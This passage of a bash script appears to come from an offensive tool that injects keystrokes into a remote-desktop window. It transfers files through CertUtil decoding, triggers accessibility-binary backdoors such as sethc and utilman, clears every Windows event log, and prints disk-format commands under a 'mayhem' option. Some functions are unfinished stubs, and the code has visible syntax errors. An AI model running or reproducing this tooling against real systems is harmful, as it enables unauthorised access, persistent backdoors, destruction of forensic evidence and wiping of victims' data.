                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${data:i:chunks}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            keyboard "-----END CERTIFICATE-----" "keystrokes"
            keyboard "Ctrl+Z" "custom_keystroke"
            keyboard "Return" "custom_keystroke"
            keyboard "CertUtil.exe -f -decode \"${directory_path}\\${temporary_file}.txt\" ${remote_file}" "keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "del /f \"${directory_path}\\${temporary_file}.txt\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
        elif [[ "${mode}" == "hex" ]]
        then
        	info "Transferring file..."
            data=$(basenc -w 0 --base16 "${local_file}")

            # Append the pair of hexadecimal characters in a array
            for ((i = 0; i < ${#data}; i += 2))
            do
                encoded+=("${data:i:2}")
            done

            keyboard "copy con /y \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
            keyboard "Return" "custom_keystroke"

            counter=0
            for ((i = 0; i < ${#encoded[@]}; i++))
            do
                if ((counter == 7))
                then
                    keyboard "${encoded[i]}" "keystrokes"
                    keyboard "space" "custom_keystroke"
                elif ((counter == 8))
                then
                    keyboard "space" "custom_keystroke"
                    ((counter++))
                elif ((counter == 15))
                then
                    keyboard "${encoded[i]}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                elif ((i == ${#encoded[@]} - 1))
                then
                    keyboard "${encoded[i]}" "keystrokes"
                    keyboard "Ctrl+Z" "custom_keystroke"
                    keyboard "Return" "custom_keystroke"
                else
                   	keyboard "${encoded[i]}" "keystrokes"
                   	keyboard "space" "custom_keystroke"
                fi

                if ((counter == 15))
                then
                    counter=0
                else
                    ((counter++))
                fi
            done

            keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${temporary_file}.hex\" \"${remote_file}\" 4" "keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "del /f \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
        fi

        finish "File transferred!"
    }
    if [[ ! -f "${local_file}" ]]
    then
        error "The file does not exist!"
        quit 1
    fi
: <<-'COMMENT'
TODO: Implement action for alternatives commands, such as "compression" (gzip)
and evasion for implementating encryption

Add more upload methods Base2, Base8, Base10, Unicode hex 4, Unicode hex 8

Add editor as a upload method by using notepad.exe in windows
Either the VARIANT will be dialogbox or searchbox
COMMENT
    case "${method}" in
        "" | "pwshb64")
            _base64 "powershell" "${action}" "${evasion}"
            ;;
        "cmdb64")
            copy_con "base64"
            ;;
        "nixb64")
            _base64 "console" "${action}"
            ;;
        "outfile")
            output_variable "text"
            ;;
        "outfileb64")
            output_variable "base64"
            ;;
        "echofile")
            output_variable "console"
            ;;
        "echofileb64")
            output_variable "consoleb64"
            ;;
        "copycon")
            copy_con "text"
            ;;
        "pwshhex")
            base16 "powershell"
            ;;
        "cmdhex")
            base16 "certutil"
            ;;
        "copyconhex")
            copy_con "hex"
            ;;
        "nixhex")
            base16 "console"
            ;;
        "outfilehex")
            output_variable "hex"
            ;;
        *)
            error "Invalid File Transfer Technique!" >&2
            info "Available methods are: pwshb64, cmdb64, nixb64, outfile, outfileb64, echofile, echofileb64, copycon, pwshhex, cmdhex, copyconhex, nixhex, and outfilehex"
            quit 1
            ;;
    esac
}

function elevate() {
    local method="${1}"
    local action="${2}"

    function bypassuac() {
        read -rd '' description <<-'EOF'
        Fill in the description of the technique
        EOF

        if [[ "${PLATFORM}" != "windows" ]]
        then
            error "UAC only exists on Windows operating system!"
            quit 1
        fi

        if [[ ${action} == "fodhelper" ]]
        then
            echo ""
        fi
    }
    # TODO: add -a, --action flag
    # -a info -p <windows | linux> -m bypassuac

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    echo "Not implemented"
}

function persistence() {
    local method="${1}"
    local action="${2}"

    function create_user() {
        read -rd '' windows_description <<-'EOF'
        Fill in the description of the technique
        EOF
        read -rd '' linux_description <<-'EOF'
        Fill in the description of the technique
        EOF

        # TODO: Print out information with commands to instruct the user both commands and cmdlet
        # Add a cleanup method

        if [[ "${action}" == "info" ]]
        then
            info "Create Windows User Account"
            echo "${windows_description}"
        elif [[ "${action}" == "info" ]]
        then
            info "Create Linux User Account"
            echo "${linux_description}"
        else
            error "Invalid mode!"
        fi
        if [[ "${PLATFORM}" == "windows" ]]
        then
            echo "Windows"
        elif [[ "${PLATFORM}" == "linux" ]]
        then
            echo "Linux"
        fi
    }

    function sticky_keys() {
        read -d '' description <<-'EOF'
        Fill in the description of the technique
        EOF
        # TODO: Print out information with commands to instruct the user both commands and cmdlet
        # Add a cleanup method
        if [[ "${PLATFORM}" != "windows" ]]
        then
            error "Registry keys only exists on Windows operating system!"
            quit 1
        fi

        if [[ "${action}" == "info" ]]
        then
            info "Sticky Keys"
            echo "${description}"
        elif [[ "${action}" == "backdoor" ]]
        then
            info "Activating sethc.exe (sticky keys) backdoor..."
            info "Pressing SHIFT key 5 times"
            for ((i = 1; i <= 5; i++))
            do
                info "SHIFT: ${i}"
                keyboard "shift" "custom_keystroke"
            done
            finish "Backdoor activated!"
        else
            error "Invalid mode!"
        fi
    }

    function utility_manager() {
        read -d '' description <<-'EOF'
        Fill in the description of the technique
        EOF
        # TODO: Print out information with commands to instruct the user both commands and cmdlet
        # Add a cleanup method
        if [[ "${PLATFORM}" != "windows" ]]
        then
            error "Registry keys only exists on Windows operating system!"
            quit 1
        fi

        if [[ "${action}" == "info" ]]
        then
            info "Utility Manager"
            echo "${description}"
        elif [[ "${action}" == "backdoor" ]]
        then
            info "Activating utilman.exe (utility manager) backdoor..."
            keyboard "Super+u" "custom_keystroke"
            finish "Backdoor activated!"
        else
            error "Invalid mode!"
        fi
    }

    function magnifier() {
        read -d '' description <<-'EOF'
        Fill in the description of the technique
        EOF
        # TODO: Print out information with commands to instruct the user both commands and cmdlet
        # Add a cleanup method
        if [[ "${PLATFORM}" != "windows" ]]
        then
            error "Registry keys only exists on Windows operating system!"
            quit 1
        fi

        if [[ "${action}" == "info" ]]
        then
            info "Magnifier"
            echo "${description}"
        elif [[ "${action}" == "backdoor" ]]
        then
            info "Activating magnifier.exe backdoor..."
            keyboard "Super+equal" "custom_keystroke"
            keyboard "Super+minus" "custom_keystroke"
            finish "Backdoor activated!"
        else
            error "Invalid mode!"
        fi
    }

    function narrator() {
        read -d '' description <<-'EOF'
        Fill in the description of the technique
        EOF
        # TODO: Print out information with commands to instruct the user both commands and cmdlet
        # Add a cleanup method
        if [[ "${PLATFORM}" != "windows" ]]
        then
            error "Registry keys only exists on Windows operating system!"
            quit 1
        fi

        if [[ "${action}" == "info" ]]
        then
            info "Narrator"
            echo "${description}"
        elif [[ "${action}" == "backdoor" ]]
        then
            info "Activating narrator.exe backdoor..."
            keyboard "Super+Return" "custom_keystroke"
            finish "Backdoor activated!"
        else
            error "Invalid mode!"
        fi
    }

    function display_switch() {
        read -d '' description <<-'EOF'
        Fill in the description of the technique
        EOF
        # TODO: Print out information with commands to instruct the user both commands and cmdlet
        # Add a cleanup method
        if [[ "${PLATFORM}" != "windows" ]]
        then
            error "Registry keys only exists on Windows operating system!"
            quit 1
        fi

        if [[ "${action}" == "info" ]]
        then
            info "Display Switch"
            echo "${description}"
        elif [[ "${action}" == "backdoor" ]]
        then
            info "Activating displayswitch.exe backdoor..."
            keyboard "Super+p" "custom_keystroke"
            finish "Backdoor activated!"
        else
            error "Invalid mode!"
        fi
    }
    # -a, --action flag "info,backdoor". For "info" contains the execution commands
    # for both command prompt and powershell. To enumerate, persistence and cleanup
    # For "backdoor" to activate the backdoor
    # TODO: Fill in the rest of the persistence methods
    case "${method}" in
        "createuser")
            create_user
            ;;
        "sethc")
            sticky_keys
            ;;
        "utilman")
            utility_manager
            ;;
        "magnifier")
            magnifier
            ;;
        "narrator")
            narrator
            ;;
       "displayswitch")
            display_switch
            ;;
        *)
            error "Invalid Persistence Technique!" >&2
            quit 1
            ;;
    esac
}

function antiforensics() {
    local method="${1}"
    local action="${2}"

    function window_event_log_utility() {
        read -d '' description <<-'EOF'
        Fill in the description of the technique
        EOF

        if [[ "${PLATFORM}" != "windows" ]]
        then
            error "This method is only exclusive for windows!"
            quit 1
        fi

        if [[ "${action}" == "info" ]]
        then
            info "Clear Windows Event Logs"
            echo "${description}"
        elif [[ "${action}" == "quick" ]]
        then
            read_input "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
        elif [[ "${action}" == "full" ]]
        then
        # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
            echo "not implemented"
        else
        # TODO: If the mode was invalid display the available options to inform the user
            error "Invalid mode!"
        fi
    }

    function clear_event_log() {
        read -d '' description <<-'EOF'
        Fill in the description of the technique
        EOF

        if [[ "${PLATFORM}" != "windows" ]]
        then
            error "This method is only exclusive for windows!"
            quit 1
        fi

        if [[ "${action}" == "info" ]]
        then
            info "Clear Windows Event Logs via PowerShell"
            echo "${description}"
        elif [[ "${action}" == "quick" ]]
        then
            read_input "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
        elif [[ "${action}" == "full" ]]
        then
        # TODO: Include the wiper and then transfer it with Base64 powershell terminal
            echo "not implemented"
        else
        # TODO: If the mode was invalid display the available options to inform the user
            error "Invalid mode!"
        fi
    }

    function event_viewer() {
        read -d '' description <<-'EOF'
        Fill in the description of the technique
        EOF

        if [[ "${PLATFORM}" != "windows" ]]
        then
            error "This method is only exclusive for windows!"
            quit 1
        fi

        if [[ "${action}" == "info" ]]
        then
            # TODO: Include information of this technique
            info "Event Viewer"
            echo "${description}"
        elif [[ "${action}" == "manual" ]]
        then
            dialogue_box "eventvwr.msc"
        else
            # TODO: If the mode was invalid display the available options to inform the user
            error "Invalid mode!"
        fi
    }

    function clear_registry_values() {
        # TODO: Convert these commands into powershell cmdlets
        # reg.exe delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /reg:64 /f
        # reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /va /reg:64 /f
        echo ""
    }
    # TODO: Include features for anti-forensics also include eventvwr.msc with a dialog box

    # -a <info (display info) | execute (to execute the commands | script (to transfer script) | manual (display the commands)>
    # -p <windows | linux> -m <wevtutil | clearevent>

    # Batch script
    # Powershell script
    # Bash script
    case "${method}" in
        "wevtutil")
            window_event_log_utility "${method}" "${action}"
            ;;
        "clearevent")
            clear_event_log "${method}" "${action}"
            ;;
        "eventvwr")
            event_viewer "${method}" "${action}"
            ;;
        *)
            error "Invalid Antiforensic Technique!" >&2
            quit 1
            ;;
    esac
}

function mayhem() {
    local method="${1}"
    local action="${2}"

    function format_disk() {
        local mode="${1}"

        read -rd '' description <<-'EOF'
        Fill in the description of the technique
        EOF

        if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
        then
            error "Only both linux and windows are supported for this method!"
            quit 1
        fi

        if [[ "${PLATFORM}" == "windows" ]]
            if [[ "${mode}" == "diskpart" ]]
            then
                if [[ "${action}" == "info" ]]
                then
                    # TODO: Include information of this technique
                    info "Format Disk"
                    echo "${description}"
                elif [[ "${action}" == "cmd" ]]
                then
                    echo "diskpart.exe"
                else
                    # TODO: If the mode was invalid display the available options to inform the user
                    error "Invalid mode!"
                fi
            elif [[ "${mode}" == "cmdlet" ]]
            then
                echo "New-Partition -DiskNumber 1 -UseMaximumSize -AssignDriveLetter C"
                echo "Format-Volume -DriveLetter C -FileSystemLabel "New" -FileSystem NTFS -Full -Force -Confirm:\$false"
            fi
        if [[ "${PLATFORM}" == "linux" && "${mode}" == "shred" ]]
        then
            echo "shred and dd"
        fi
    }

    function boot_partition() {
        local mode="${1}"

        read -rd '' description <<-'EOF'
        Fill in the description of the technique
        EOF

        if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
        then
            error "Only both linux and windows are supported for this method!"
            quit 1
        fi

        echo "not yet implemented"
        exit 1
    }

    case "${method}" in
        "diskpart")
            format_disk "diskpart"
            ;;
        "pwsh")
            format_disk "cmdlet"
            ;;
        "shred")
            format_disk "console"
            ;;
        "mbr")
            boot_partition ""
        *)
            error "Invalid anti-forensic technique!" >&2
            quit 1
            ;;
    esac
}

# I need to tell the user how to fucking use me
function usage() {
    echo "Usage:
    $(basename ${0}) <flags>

Flags:

COMMON OPTIONS:
    -c, --command <command | file>      Specify a command or a file contains commands
                                        to execute

    -p, --platform <operating_system>   Specify the operating system (\"windows\" is
                                        set by default if not specified)

    -w, --windowname <window_name>      Specify the window name to focus on the
                                        active window (\"freerdp\" is set by default
                                        if not specified)

    -v, --version                       Display the program's version number
    -h, --help                          Display the help menu

UPLOAD FILES:
    -i, --input <input_file>            Specify the local input file to transfer
    -o, --output <output_file>          Specify the remote output file to transfer

METHODS:
    -m, --method <method>               Specify a method. For command execution method
                                        \"none\" is set by default if not specified.
                                        For file transfer \"pwshb64\" is set by default
                                        if not specified. Other available methods are:
                                        \"elevate\", \"persistence\", \"antiforensics\", and
                                        \"mayhem\"

    -s, --submethod <submethod>         Specify a submethod from a method (applies
                                        with -m flag)

    -a, --action <action>               Specify an action from a method and/or
                                        submethod (applies with -m and/or -s flag)

    -e, --evasion <evasion>             Specify an evasion method for file upload
                                        (only works for \"pwshb64\")"
    quit 0
}

function subcommand() {
    local suboption="${1}"

    case "${suboption}" in
        "execute")
            shift
            ;;
        "upload")
            shift
            ;;
        "elevate")
            shift
            ;;
        "persistence")
            shift
            ;;
        "antiforensics")
            shift
            ;;
        "mayhem")
            shift
            ;;
    esac
}

function main() {
    OPTIONS="c:i:o:m:s:a:e:p:w:v:h"
    LONG_OPTIONS="command:,input:,output:,method:,submethod:,action:,evasion:,platform:,windowname:,version:,help"

    if ((${?} != 0))
    then
        error "Failed to parse options... Exiting." >&2
        quit 1
    fi

    eval set -- "${PARSED_OPTIONS}"

    while true
    do
        case ${1} in
            -c | --command)
                COMMAND="${2}"
                shift 2
                ;;
            -i | --input)
                INPUT="${2}"
                shift 2
                ;;
            -o | --output)
                OUTPUT="${2}"
                shift 2
                ;;
            -m | --method)
                METHOD="${2,,}"
                shift 2
                ;;
            -s | --submethod)
                SUBMETHOD="${2,,}"
                shift 2
                ;;
            -a | --action)
                ACTION="${2,,}"
                shift 2
                ;;
            -e | --evasion)
                EVASION="${2,,}"
                shift 2
                ;;
            -p | --platform)
                PLATFORM="${2,,}"
                shift 2
                ;;
            -w | --windowname)
                WINDOWNAME="${2}"
                shift 2
                ;;
            -v | --version)
                VERSION=1
                shift
                ;;
            -h | --help)
                usage
                ;;
            --)
                shift
                break
                ;;
            *)
                echo "Invalid option: ${1}" >&2
                exit 1
                ;;
        esac
    done

    trap quit SIGINT
    check_dependencies

    ((VERSION == 1)) && echo "${0} version: v1.0"

    subcommand "execute"

    # TODO: Put all of this in get_window_name function to be applied globally
    # If window name isn't specified it'll set to FreeRDP as default.
    if [[ (-z "${WINDOWNAME}" || "${WINDOWNAME,,}" == "freerdp") ]]
    then
        WINDOWNAME="FreeRDP"
    elif [[ (-n "${WINDOWNAME}" && "${WINDOWNAME,,}" != "freerdp") ]]
    then
        WINDOWNAME="${WINDOWNAME}"
    fi

    if [[ ! $(get_window_name) ]]
    then
        error "Application name is absent or invalid window name."
        quit 1
    fi
    # When input is string and not a file. It executes command
    if [[ -n "${COMMAND}" ]]
    then
        [[ -z "${METHOD}" ]] && METHOD="none"
        read_input "${COMMAND}" "${METHOD}"
    fi

    # When the input for selecting an operating system is empty
    # it'll choose "windows" as default.
    if [[ -z "${PLATFORM}" ]]
    then
        PLATFORM="windows"
    elif [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
    then
        error "Invalid or operating system not supported. Allowed values: 'windows' or 'linux'."
        quit 1
    fi

    if [[ -n "${INPUT}" && -n "${OUTPUT}" ]]
    then
        upload "${INPUT}" "${OUTPUT}" "${METHOD}" "${ACTION}" "${EVASION}"
    elif [[ "${METHOD}" == "elevate" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
    then
        elevate "${SUBMETHOD}" "${ACTION}"
    elif [[ "${METHOD}" == "persistence" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
    then
        persistence "${SUBMETHOD}" "${ACTION}"
    elif [[ "${METHOD}" == "antiforensics" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
    then
        antiforensics "${SUBMETHOD}" "${ACTION}"
    elif [[ "${METHOD}" == "mayhem" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
    then
        mayhem "${SUBMETHOD}" "${ACTION}"
    fi
}

main "${@}"
